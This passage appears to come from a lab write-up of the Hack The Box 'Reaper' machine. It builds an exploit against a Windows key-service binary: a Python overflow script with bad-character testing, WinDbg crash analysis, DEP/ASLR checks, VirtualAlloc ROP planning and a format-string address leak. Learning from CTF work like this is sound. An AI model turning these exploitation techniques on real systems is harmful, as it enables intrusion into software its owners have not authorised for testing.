        <span class="n">BC</span> <span class="o">=</span> <span class="n">BC</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">item</span><span class="p">,</span><span class="s1">''</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">BC</span>
</code></pre></div>
<p>I'll start with the full range of bytes between 0x00 and 0xFF.   As bad characters are identified, I can add them to the variable <code>badchars</code>, which gets passed as the first argument.</p>
<div class="highlight"><pre><span></span><code><span class="err">┌──</span><span class="p">(</span><span class="n">notroot</span><span class="err">㉿</span><span class="n">elysium</span><span class="p">)</span><span class="o">-</span><span class="p">[(</span><span class="n">master</span><span class="p">)</span> <span class="mi">1</span> <span class="o">~/</span><span class="n">htb</span><span class="o">/</span><span class="n">machines</span><span class="o">/</span><span class="n">reaper</span><span class="p">]</span>
<span class="err">└─$</span> <span class="n">cat</span> <span class="n">poc</span><span class="o">.</span><span class="n">py</span> <span class="o">|</span> <span class="n">awk</span> <span class="o">-</span><span class="n">v</span> <span class="n">RS</span><span class="o">=</span><span class="s2">""</span> <span class="s1">'/bufs/'</span> 

    <span class="n">crash</span><span class="o">=</span><span class="mi">3000</span>
    <span class="n">crashlen</span><span class="o">=</span><span class="mi">88</span>
    <span class="n">onramp</span><span class="o">=</span><span class="p">(</span><span class="s2">"</span><span class="se">\x41</span><span class="s2">"</span><span class="p">)</span><span class="o">*</span><span class="n">crashlen</span>
    <span class="n">SEH</span><span class="o">=</span><span class="p">(</span><span class="s2">"</span><span class="se">\x42</span><span class="s2">"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
    <span class="n">bad</span> <span class="o">=</span> <span class="n">gen_badchars</span><span class="p">(</span><span class="n">badchars</span><span class="p">,</span><span class="n">start</span><span class="o">=</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s2">"</span><span class="se">\xff</span><span class="s2">"</span><span class="p">)</span>   <span class="c1">#&lt;-----</span>
    <span class="n">offramp</span><span class="o">=</span> <span class="p">(</span><span class="s2">"</span><span class="se">\x43</span><span class="s2">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">crash</span> <span class="o">-</span> <span class="nb">sum</span><span class="p">([</span><span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">[</span>
        <span class="n">onramp</span><span class="p">,</span>
        <span class="n">SEH</span><span class="p">,</span>
        <span class="n">bad</span>     <span class="c1">#&lt;-----</span>
    <span class="p">]])))</span>
    <span class="n">compiled_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">onramp</span><span class="si">}{</span><span class="n">SEH</span><span class="si">}{</span><span class="n">bad</span><span class="si">}{</span><span class="n">offramp</span><span class="si">}</span><span class="s2">"</span>   <span class="c1">#&lt;------</span>
    <span class="n">pay</span> <span class="o">=</span> <span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">(</span><span class="n">compiled_payload</span><span class="p">,</span><span class="s1">'latin-1'</span><span class="p">)))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">)</span>
    <span class="n">bufs</span> <span class="o">=</span> <span class="p">[</span><span class="s2">"1</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="sa">f</span><span class="s2">"110-FE9A1-550-A271-0109-</span><span class="si">{</span><span class="n">pay</span><span class="si">}</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"2</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"3</span><span class="se">\n</span><span class="s2">"</span><span class="p">]</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">bufs</span><span class="p">)):</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">))</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">bufs</span><span class="p">[</span><span class="n">x</span><span class="p">][:</span><span class="mi">32</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">((</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x0a</span><span class="s1">'</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">),</span><span class="sa">r</span><span class="s1">'</span><span class="se">\\</span><span class="s1">n'</span><span class="p">)</span><span class="si">}</span><span class="s2">[...]"</span><span class="p">)</span>
        <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">bufs</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">))</span>
</code></pre></div>
<p>When I resend, I find there are no bad characters</p>
<div class="highlight"><pre><span></span><code><span class="m">0</span>:003&gt;<span class="w"> </span>db<span class="w"> </span>rsp<span class="w"> </span>L0xFF+9
000000d2<span class="sb">`</span>a29fe908<span class="w">  </span><span class="m">42</span><span class="w"> </span><span class="m">42</span><span class="w"> </span><span class="m">42</span><span class="w"> </span><span class="m">42</span><span class="w"> </span><span class="m">42</span><span class="w"> </span><span class="m">42</span><span class="w"> </span><span class="m">42</span><span class="w"> </span><span class="m">42</span>-00<span class="w"> </span><span class="m">01</span><span class="w"> </span><span class="m">02</span><span class="w"> </span><span class="m">03</span><span class="w"> </span><span class="m">04</span><span class="w"> </span><span class="m">05</span><span class="w"> </span><span class="m">06</span><span class="w"> </span><span class="m">07</span><span class="w">  </span>BBBBBBBB........
000000d2<span class="sb">`</span>a29fe918<span class="w">  </span><span class="m">08</span><span class="w"> </span><span class="m">09</span><span class="w"> </span>0a<span class="w"> </span>0b<span class="w"> </span>0c<span class="w"> </span>0d<span class="w"> </span>0e<span class="w"> </span>0f-10<span class="w"> </span><span class="m">11</span><span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="m">13</span><span class="w"> </span><span class="m">14</span><span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">16</span><span class="w"> </span><span class="m">17</span><span class="w">  </span>................
000000d2<span class="sb">`</span>a29fe928<span class="w">  </span><span class="m">18</span><span class="w"> </span><span class="m">19</span><span class="w"> </span>1a<span class="w"> </span>1b<span class="w"> </span>1c<span class="w"> </span>1d<span class="w"> </span>1e<span class="w"> </span>1f-20<span class="w"> </span><span class="m">21</span><span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">24</span><span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="m">26</span><span class="w"> </span><span class="m">27</span><span class="w">  </span>........<span class="w"> </span>!<span class="s2">"#</span>$<span class="s2">%&amp;'</span>
<span class="s2">000000d2`a29fe938  28 29 2a 2b 2c 2d 2e 2f-30 31 32 33 34 35 36 37  ()*+,-./01234567</span>
<span class="s2">000000d2`a29fe948  38 39 3a 3b 3c 3d 3e 3f-40 41 42 43 44 45 46 47  89:;&lt;=&gt;?@ABCDEFG</span>
<span class="s2">000000d2`a29fe958  48 49 4a 4b 4c 4d 4e 4f-50 51 52 53 54 55 56 57  HIJKLMNOPQRSTUVW</span>
<span class="s2">000000d2`a29fe968  58 59 5a 5b 5c 5d 5e 5f-60 61 62 63 64 65 66 67  XYZ[\]^_`abcdefg</span>
<span class="s2">000000d2`a29fe978  68 69 6a 6b 6c 6d 6e 6f-70 71 72 73 74 75 76 77  hijklmnopqrstuvw</span>
<span class="s2">000000d2`a29fe988  78 79 7a 7b 7c 7d 7e 7f-80 81 82 83 84 85 86 87  xyz{|}~.........</span>
<span class="s2">000000d2`a29fe998  88 89 8a 8b 8c 8d 8e 8f-90 91 92 93 94 95 96 97  ................</span>
<span class="s2">000000d2`a29fe9a8  98 99 9a 9b 9c 9d 9e 9f-a0 a1 a2 a3 a4 a5 a6 a7  ................</span>
<span class="s2">000000d2`a29fe9b8  a8 a9 aa ab ac ad ae af-b0 b1 b2 b3 b4 b5 b6 b7  ................</span>
<span class="s2">000000d2`a29fe9c8  b8 b9 ba bb bc bd be bf-c0 c1 c2 c3 c4 c5 c6 c7  ................</span>
<span class="s2">000000d2`a29fe9d8  c8 c9 ca cb cc cd ce cf-d0 d1 d2 d3 d4 d5 d6 d7  ................</span>
<span class="s2">000000d2`a29fe9e8  d8 d9 da db dc dd de df-e0 e1 e2 e3 e4 e5 e6 e7  ................</span>
<span class="s2">000000d2`a29fe9f8  e8 e9 ea eb ec ed ee ef-f0 f1 f2 f3 f4 f5 f6 f7  ................</span>
<span class="s2">000000d2`a29fea08  f8 f9 fa fb fc fd fe ff</span>
</code></pre></div>
<h3 id="easy-so-far-whats-the-catch">Easy so far, what's the catch?<a class="headerlink" href="#easy-so-far-whats-the-catch" title="Permanent link">¶</a></h3>
<p>This is slightly unsettling to me, because this machine is supposed to be an <code>INSANE</code> level machine, but crash + control SEH + badchars, pretty standard stuff so far, maybe even too easy.  So what's the catch?</p>
<p>And then it occurred to me, to check on loaded process and module protections</p>
<div class="highlight"><pre><span></span><code><span class="m">0</span>:003&gt;<span class="w"> </span>!load<span class="w"> </span>narly

<span class="w">      </span>__s<span class="p">|</span>I<span class="o">}</span>*!<span class="o">{</span>a.<span class="w">                        </span>._s,aan2*a
<span class="w">     </span>_wY1+~-<span class="w">    </span><span class="o">)</span>S,<span class="w">                     </span>.ae<span class="s2">"~=:...:X</span>
<span class="s2">   .vXl+:.       -4c                   &lt;2+=|==::..:d</span>
<span class="s2">   vvi=;..        -?o,                =2=+==:::...=d</span>
<span class="s2">  )nv=:.            )5,              .2=--.......-=d</span>
<span class="s2">  ue+::              -*s             &lt;c .        .=d</span>
<span class="s2">  m&gt;==::..     ._,     &lt;s,           )c           :d</span>
<span class="s2">  #==viii|===; {Xs=,    -{s          )c         ..:d</span>
<span class="s2">  Z;{nnonnvvii;v(-{%=.    ~s,        )e:====||iiv%=d</span>
<span class="s2">  X={oooonvvIl;3;  -{%,    -*&gt;       )2&lt;onnnnvnnnn&gt;d</span>
<span class="s2">  X=)vvvvIliii:3;    -!s.   :)s.     )e&lt;oonvlllllIid</span>
<span class="s2">  X=&lt;lllliii|=:n;      -1c.  +|1,    )z&lt;nvii||+|+|vX</span>
<span class="s2">  S=&lt;lli|||=:: n;        "</span>nc<span class="w">  </span>-s%<span class="p">;</span><span class="w">   </span><span class="o">)</span><span class="nv">c</span><span class="o">=</span>ovl<span class="p">|</span>++<span class="o">==</span>+<span class="o">=</span>vo
<span class="w">  </span><span class="nv">X</span><span class="o">=</span>&lt;i<span class="o">||</span>+<span class="o">=</span><span class="p">;</span><span class="w"> </span>.<span class="w"> </span>.n<span class="sb">`</span><span class="w">          </span><span class="s2">"1&gt;.-{%i. )c&lt;Xnnli||++=vn</span>
<span class="s2">  X=iii&gt;==-.  :o`            "</span><span class="m">1</span>,:+iI,<span class="o">)</span>c:Sonnvli<span class="o">||=</span>v<span class="o">(</span>
<span class="w">  </span>X&gt;<span class="o">{</span>ii+<span class="p">;</span>:-<span class="w">  </span>.u<span class="o">(</span><span class="w">               </span><span class="s2">"o,-{Iw(:nvvvllii=v2</span>
<span class="s2">  S=i||;:. .=u(                 -!o,+I(:iiillii|ie`</span>
<span class="s2">  2&gt;v|==__su?`                    -?o,-:==||iisv"</span>
<span class="w">  </span><span class="o">{</span>nvnI!<span class="s2">""</span>~<span class="w">                         </span>-!sasvv<span class="o">}</span><span class="s2">""</span><span class="sb">`</span>

<span class="w">             </span>by<span class="w"> </span>Nephi<span class="w"> </span>Johnson<span class="w"> </span><span class="o">(</span>d0c_s4vage<span class="o">)</span>
<span class="w">                      </span>N<span class="w"> </span><span class="k">for</span><span class="w"> </span>gnarly!

Available<span class="w"> </span>commands:

<span class="w">    </span>!nmod<span class="w">     </span>-<span class="w"> </span>display<span class="w"> </span>/SafeSEH,<span class="w"> </span>/GS,<span class="w"> </span>DEP,<span class="w"> </span>and<span class="w"> </span>ASLR<span class="w"> </span>info<span class="w"> </span><span class="k">for</span>
<span class="w">                </span>all<span class="w"> </span>loaded<span class="w"> </span>modules

<span class="m">0</span>:003&gt;<span class="w"> </span>!nmod
66a80000<span class="w"> </span>66ab3000<span class="w"> </span>dev_keysvc<span class="w">           </span>/SafeSEH<span class="w"> </span>OFF<span class="w">     </span>*ASLR<span class="w"> </span>*DEP<span class="w"> </span>C:<span class="se">\r</span>eaper<span class="se">\d</span>ev_keysvc.exe
4a170000<span class="w"> </span>4a182000<span class="w"> </span>kernel_appcore<span class="w">       </span>/SafeSEH<span class="w"> </span>OFF<span class="w">     </span>*ASLR<span class="w"> </span>*DEP<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>YSTEM32<span class="se">\k</span>ernel.appcore.dll
4b9b0000<span class="w"> </span>4ba1a000<span class="w"> </span>mswsock<span class="w">              </span>/SafeSEH<span class="w"> </span>OFF<span class="w">     </span>*ASLR<span class="w"> </span>*DEP<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\m</span>swsock.dll
4c5e0000<span class="w"> </span>4c8d6000<span class="w"> </span>KERNELBASE<span class="w">           </span>/SafeSEH<span class="w"> </span>OFF<span class="w">     </span>*ASLR<span class="w"> </span>*DEP<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\K</span>ERNELBASE.dll
4cc90000<span class="w"> </span>4cd2e000<span class="w"> </span>msvcrt<span class="w">               </span>/SafeSEH<span class="w"> </span>OFF<span class="w">     </span>*ASLR<span class="w"> </span>*DEP<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\m</span>svcrt.dll
4d580000<span class="w"> </span>4d6a0000<span class="w"> </span>RPCRT4<span class="w">               </span>/SafeSEH<span class="w"> </span>OFF<span class="w">     </span>*ASLR<span class="w"> </span>*DEP<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\R</span>PCRT4.dll
4e0c0000<span class="w"> </span>4e12b000<span class="w"> </span>WS2_32<span class="w">               </span>/SafeSEH<span class="w"> </span>OFF<span class="w">     </span>*ASLR<span class="w"> </span>*DEP<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\W</span>S2_32.dll
4e130000<span class="w"> </span>4e1f2000<span class="w"> </span>KERNEL32<span class="w">             </span>/SafeSEH<span class="w"> </span>OFF<span class="w">     </span>*ASLR<span class="w"> </span>*DEP<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\K</span>ERNEL32.DLL
4ec70000<span class="w"> </span>4ee68000<span class="w"> </span>ntdll<span class="w">                </span>/SafeSEH<span class="w"> </span>OFF<span class="w">     </span>*ASLR<span class="w"> </span>*DEP<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>YSTEM32<span class="se">\n</span>tdll.dll

*DEP/*ASLR<span class="w"> </span>means<span class="w"> </span>that<span class="w"> </span>these<span class="w"> </span>modules<span class="w"> </span>are<span class="w"> </span>compatible<span class="w"> </span>with<span class="w"> </span>ASLR/DEP
</code></pre></div>
<p>And there it is.  DEP and ASLR are enabled.  In fact, there is nothing loaded where it isn't, so only way to win is by ROPchain to bypass DEP, and because of the latter I will need a memory leak to bypass ASLR.</p>
<p>Seeing as how we know where and how to get to the crash, we can use the following argument to <code>windbg</code> to fastforward to raised exception.  We set a breakpoint at the function that, if we pass over it, catches exception.</p>
<div class="highlight"><pre><span></span><code> -c 'bp 0x7ff766a81937; g; p; !exchain L0x4' 
</code></pre></div>
<p>One other consideration is what method to employ, and for that I found that really the only method of interest imported by <code>dev_keysvc.exe</code> is  <code>VirtualAlloc</code> that might be used for this.  We might be able to use <code>VirtualAlloc</code> in much the same way as <code>VirtualProtect</code>,  and here is how.</p>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc</a></p>
<p>VirtualAlloc:</p>
<div class="highlight"><pre><span></span><code><span class="n">LPVOID</span><span class="w"> </span><span class="nf">VirtualAlloc</span><span class="p">(</span>
<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">,</span><span class="w"> </span><span class="n">optional</span><span class="p">]</span><span class="w"> </span><span class="n">LPVOID</span><span class="w"> </span><span class="n">lpAddress</span><span class="p">,</span>
<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">]</span><span class="w">           </span><span class="n">SIZE_T</span><span class="w"> </span><span class="n">dwSize</span><span class="p">,</span>
<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">]</span><span class="w">           </span><span class="n">DWORD</span><span class="w">  </span><span class="n">flAllocationType</span><span class="p">,</span>
<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">]</span><span class="w">           </span><span class="n">DWORD</span><span class="w">  </span><span class="n">flProtect</span>
<span class="p">);</span>
</code></pre></div>
<p>"Reserves, commits, or <strong>changes</strong> the state of a region of pages in the virtual address space of the calling process. Memory allocated by this function is automatically initialized to zero. "</p>
<p>However memory already reserved and committed can have its memory protections changed/updated, if we supply <code>flProtect</code> with a value of <strong>MEM_COMMIT</strong> (<code>0x00001000</code>), we can supply an <code>flAllocationType</code> of  <strong>PAGE_EXECUTE_READWRITE</strong> (<code>0x40</code>) <a href="https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants">https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants</a>.  </p>
<p>In this way we can effectively perform a <code>VirtualProtect</code> without <code>VirtualProtect</code>, on an existing memory region.</p>
<p>And then there's the matter of ASLR.  Only rational way to bypass that is to find some type of leak of an address of one of the modules, or the binary itself, at runtime.  That way ROP gadgets can use realtive addressing added to a base address.</p>
<p>Registers at time of crash:</p>
<div class="highlight"><pre><span></span><code>0:003&gt; r
rax=00000000ffffffff rbx=000001e554b7bc60 rcx=4a4db4eaa5a70000
rdx=0000000000000000 rsi=0000000000000000 rdi=4141414141414141
rip=00007ff766a816f1 rsp=000000d2a29fe908 rbp=0000000000000000
 r8=0000000000000054  r9=0000000000000054 r10=0000000000000007
r11=000000d2a29fe820 r12=0000000000000000 r13=0000000000000000
r14=0000000000000000 r15=0000000000000000
iopl=0         nv up ei pl nz na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
</code></pre></div>
<p>RDI currently holds AAAAA... </p>
<p>With any luck, I would be able to locate the offset of RDI at time of crash, inject a format string at that location, and dereference pointers to obtain leaked addresses.  But then there's also the matter of, how to get the application to report them back to me.   A lot to figure out.  Let's start with RDI pattern and offset.</p>
<h5 id="rdi-pattern-and-offset">RDI pattern and offset<a class="headerlink" href="#rdi-pattern-and-offset" title="Permanent link">¶</a></h5>
<p>If I send another 3000 byte pattern :</p>
<div class="highlight"><pre><span></span><code>    <span class="n">pattern</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
    <span class="n">pay</span> <span class="o">=</span> <span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span><span class="s1">'latin-1'</span><span class="p">)))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">)</span>
    <span class="n">bufs</span> <span class="o">=</span> <span class="p">[</span> <span class="s2">"1</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="sa">f</span><span class="s2">"110-FE9A1-550-A271-0109-</span><span class="si">{</span><span class="n">pay</span><span class="si">}</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"2</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"3</span><span class="se">\n</span><span class="s2">"</span><span class="p">]</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">bufs</span><span class="p">)):</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">))</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">bufs</span><span class="p">[</span><span class="n">x</span><span class="p">][:</span><span class="mi">32</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">((</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x0a</span><span class="s1">'</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">),</span><span class="sa">r</span><span class="s1">'</span><span class="se">\\</span><span class="s1">n'</span><span class="p">)</span><span class="si">}</span><span class="s2">[...]"</span><span class="p">)</span>
        <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">bufs</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">))</span>
</code></pre></div>
<p>This time RDI holds a pattern:  <code>4138634137634136</code></p>
<div class="highlight"><pre><span></span><code>┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ msf-pattern_offset 64 -l 3000 -q 4138634137634136
[*] Exact match at offset 80
</code></pre></div>
<p>Not quite sure that's going to work.  I tried playing with format strings in this range but anything supplied here just gets converted to hex on the other end.  So <code>%d</code> for example is converted to hex <code>2564</code>.  Not going to work.</p>
<h3 id="time-for-another-plan">Time for another plan<a class="headerlink" href="#time-for-another-plan" title="Permanent link">¶</a></h3>
<p>While playing around with the application, I noticed that if you set a key and then activate it, it gets repeated back to you with the base64 decoded, if it is valid format:</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>nc<span class="w"> </span><span class="m">192</span>.168.56.100<span class="w"> </span><span class="m">4141</span>
Choose<span class="w"> </span>an<span class="w"> </span>option:
<span class="m">1</span>.<span class="w"> </span>Set<span class="w"> </span>key
<span class="m">2</span>.<span class="w"> </span>Activate<span class="w"> </span>key
<span class="m">3</span>.<span class="w"> </span>Exit
<span class="m">1</span>
Enter<span class="w"> </span>a<span class="w"> </span>key:<span class="w"> </span><span class="m">100</span>-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ<span class="o">==</span>
Valid<span class="w"> </span>key<span class="w"> </span>format
Choose<span class="w"> </span>an<span class="w"> </span>option:
<span class="m">4</span>.<span class="w"> </span>Set<span class="w"> </span>key
<span class="m">5</span>.<span class="w"> </span>Activate<span class="w"> </span>key
<span class="m">6</span>.<span class="w"> </span>Exit
<span class="m">2</span>
Checking<span class="w"> </span>key:<span class="w"> </span><span class="m">100</span>-FE9A1-500-A270-0102,<span class="w"> </span>Comment:<span class="w"> </span>Standard<span class="w"> </span>License
Could<span class="w"> </span>not<span class="w"> </span>find<span class="w"> </span>key!
Choose<span class="w"> </span>an<span class="w"> </span>option:
<span class="m">7</span>.<span class="w"> </span>Set<span class="w"> </span>key
<span class="m">8</span>.<span class="w"> </span>Activate<span class="w"> </span>key
<span class="m">9</span>.<span class="w"> </span>Exit
</code></pre></div>
<p>This part of output:
</p><div class="highlight"><pre><span></span><code>Checking key: 100-FE9A1-500-A270-0102, Comment: Standard License
</code></pre></div><p></p>
<p>If we try to send a format string instead:</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>nc<span class="w"> </span><span class="m">192</span>.168.56.100<span class="w"> </span><span class="m">4141</span>
Choose<span class="w"> </span>an<span class="w"> </span>option:
<span class="m">1</span>.<span class="w"> </span>Set<span class="w"> </span>key
<span class="m">2</span>.<span class="w"> </span>Activate<span class="w"> </span>key
<span class="m">3</span>.<span class="w"> </span>Exit
<span class="m">1</span>
Enter<span class="w"> </span>a<span class="w"> </span>key:<span class="w"> </span>%s%p
Invalid<span class="w"> </span>key<span class="w"> </span>format
Choose<span class="w"> </span>an<span class="w"> </span>option:
<span class="m">4</span>.<span class="w"> </span>Set<span class="w"> </span>key
<span class="m">5</span>.<span class="w"> </span>Activate<span class="w"> </span>key
<span class="m">6</span>.<span class="w"> </span>Exit
<span class="m">2</span>

Could<span class="w"> </span>not<span class="w"> </span>find<span class="w"> </span>key!
Choose<span class="w"> </span>an<span class="w"> </span>option:
<span class="m">1</span>.<span class="w"> </span>Set<span class="w"> </span>key
<span class="m">2</span>.<span class="w"> </span>Activate<span class="w"> </span>key
<span class="m">3</span>.<span class="w"> </span>Exit
</code></pre></div>
<p>It doesn't work, we get an empty string.</p>
<p>However when I set a key, activate it, then set another key as a format string, and activate that, I get a leak of some kind:</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>nc<span class="w"> </span><span class="m">192</span>.168.56.100<span class="w"> </span><span class="m">4141</span>
Choose<span class="w"> </span>an<span class="w"> </span>option:
<span class="m">1</span>.<span class="w"> </span>Set<span class="w"> </span>key
<span class="m">2</span>.<span class="w"> </span>Activate<span class="w"> </span>key
<span class="m">3</span>.<span class="w"> </span>Exit
<span class="m">1</span>
Enter<span class="w"> </span>a<span class="w"> </span>key:<span class="w"> </span><span class="m">110</span>-FE9A1-550-A271-0109-U3RhbmRhcmQgTGljZW5zZQ<span class="o">==</span>
Valid<span class="w"> </span>key<span class="w"> </span>format
Choose<span class="w"> </span>an<span class="w"> </span>option:
<span class="m">4</span>.<span class="w"> </span>Set<span class="w"> </span>key
<span class="m">5</span>.<span class="w"> </span>Activate<span class="w"> </span>key
<span class="m">6</span>.<span class="w"> </span>Exit
<span class="m">2</span>
Checking<span class="w"> </span>key:<span class="w"> </span><span class="m">110</span>-FE9A1-550-A271-0109,<span class="w"> </span>Comment:<span class="w"> </span>Standard<span class="w"> </span>License
Could<span class="w"> </span>not<span class="w"> </span>find<span class="w"> </span>key!
Choose<span class="w"> </span>an<span class="w"> </span>option:
<span class="m">7</span>.<span class="w"> </span>Set<span class="w"> </span>key
<span class="m">8</span>.<span class="w"> </span>Activate<span class="w"> </span>key
<span class="m">9</span>.<span class="w"> </span>Exit
<span class="m">1</span>
Enter<span class="w"> </span>a<span class="w"> </span>key:<span class="w"> </span>%s%p
Invalid<span class="w"> </span>key<span class="w"> </span>format
Choose<span class="w"> </span>an<span class="w"> </span>option:
<span class="m">10</span>.<span class="w"> </span>Set<span class="w"> </span>key
<span class="m">11</span>.<span class="w"> </span>Activate<span class="w"> </span>key
<span class="m">12</span>.<span class="w"> </span>Exit
<span class="m">2</span>
Checking<span class="w"> </span>key:<span class="w"> </span>Checking<span class="w"> </span>key:<span class="w"> </span>000001BA0,<span class="w"> </span>Comment:<span class="w"> </span>
Could<span class="w"> </span>not<span class="w"> </span>find<span class="w"> </span>key!
Choose<span class="w"> </span>an<span class="w"> </span>option:
<span class="m">13</span>.<span class="w"> </span>Set<span class="w"> </span>key
<span class="m">14</span>.<span class="w"> </span>Activate<span class="w"> </span>key
<span class="m">15</span>.<span class="w"> </span>Exit
</code></pre></div>
<p>This:</p>
<div class="highlight"><pre><span></span><code>Checking key: Checking key: 000001BA0, Comment: 
</code></pre></div>
<p>It repeated the "Checking key: " portion, but probably because my format string was <code>%s%p</code>.  If I rerun the test with just <code>%p</code>:</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>nc<span class="w"> </span><span class="m">192</span>.168.56.100<span class="w"> </span><span class="m">4141</span>
Choose<span class="w"> </span>an<span class="w"> </span>option:
<span class="m">1</span>.<span class="w"> </span>Set<span class="w"> </span>key
<span class="m">2</span>.<span class="w"> </span>Activate<span class="w"> </span>key
<span class="m">3</span>.<span class="w"> </span>Exit
<span class="m">1</span>
Enter<span class="w"> </span>a<span class="w"> </span>key:<span class="w"> </span><span class="m">110</span>-FE9A1-550-A271-0109-U3RhbmRhcmQgTGljZW5zZQ<span class="o">==</span>
Valid<span class="w"> </span>key<span class="w"> </span>format
Choose<span class="w"> </span>an<span class="w"> </span>option:
<span class="m">4</span>.<span class="w"> </span>Set<span class="w"> </span>key
<span class="m">5</span>.<span class="w"> </span>Activate<span class="w"> </span>key
<span class="m">6</span>.<span class="w"> </span>Exit
<span class="m">2</span>
Checking<span class="w"> </span>key:<span class="w"> </span><span class="m">110</span>-FE9A1-550-A271-0109,<span class="w"> </span>Comment:<span class="w"> </span>Standard<span class="w"> </span>License
Could<span class="w"> </span>not<span class="w"> </span>find<span class="w"> </span>key!
Choose<span class="w"> </span>an<span class="w"> </span>option:
